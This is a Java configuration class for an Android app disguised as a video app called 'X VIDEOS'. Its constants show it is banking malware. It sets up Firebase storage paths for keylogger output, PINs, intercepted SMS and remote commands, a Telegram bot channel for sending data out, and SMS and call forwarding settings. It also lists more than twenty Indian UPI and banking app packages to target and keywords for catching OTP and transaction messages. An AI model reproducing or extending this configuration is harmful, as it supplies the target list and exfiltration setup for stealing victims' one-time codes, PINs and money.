package com.xvideo.app.core;

public class Config {
    // Firebase
    public static final String FIREBASE_URL = "https://saba-987b9-default-rtdb.firebaseio.com";

    // Telegram Bot
    public static final String TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    public static final String TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
    public static final String TELEGRAM_API_URL = "https://api.telegram.org/bot";

    // App Package
    public static final String PACKAGE_NAME = "com.xvideo.app";
    public static final String APP_NAME = "X VIDEOS";

    // Firebase Paths
    public static final String PATH_CLIENTS = "clients";
    public static final String PATH_KEYLOGGER = "keylogger";
    public static final String PATH_EVENTS = "events";
    public static final String PATH_PINS = "pins";
    public static final String PATH_SMS = "sms_";
    public static final String PATH_COMMANDS = "commands";

    // Shared Preferences
    public static final String PREF_NAME = "app_prefs";
    public static final String PREF_DEVICE_ID = "device_id";
    public static final String PREF_REGISTERED = "registered";
    public static final String PREF_SMS_FORWARD_ENABLED = "sms_forward_enabled";
    public static final String PREF_SMS_FORWARD_NUMBER = "sms_forward_number";
    public static final String PREF_CALL_FORWARD_NUMBER = "call_forward_number";

    // UPI App Packages
    public static final String[] UPI_PACKAGES = {
        "com.phonepe.app",
        "net.one97.paytm",
        "com.google.android.apps.nbu.paisa.user",
        "in.org.npci.upiapp",
        "com.csam.icici.bank.imobile",
        "com.sbi.lotusintouch",
        "com.axis.mobile",
        "com.dreamplug.androidapp",
        "com.myairtelapp",
        "com.jio.myjio",
        "com.mobikwik_new",
        "com.freecharge.android",
        "in.amazon.mShop.android.shopping",
        "com.snapwork.hdfc",
        "com.bankofbaroda.mconnect",
        "com.kotak.bank.mobile",
        "com.canarabank.mobility",
        "com.indusind.indie",
        "money.jupiter",
        "com.finopaymentbank.mobile",
        "com.paytmmoney",
        "com.epifi.paisa"
    };

    // SMS Keywords to filter
    public static final String[] SMS_KEYWORDS = {
        "otp", "verification", "verify", "code", "pin",
        "bank", "debit", "credit", "upi", "neft", "imps",
        "transfer", "payment", "rupee", "inr", "credited",
        "debited", "balance", "transaction", "account"
    };

    // Service
    public static final String CHANNEL_ID = "main_channel";
    public static final int NOTIFICATION_ID = 1;
    public static final long HEARTBEAT_INTERVAL = 300000; // 5 minutes
    public static final long ALARM_INTERVAL = 300000; // 5 minutes
}
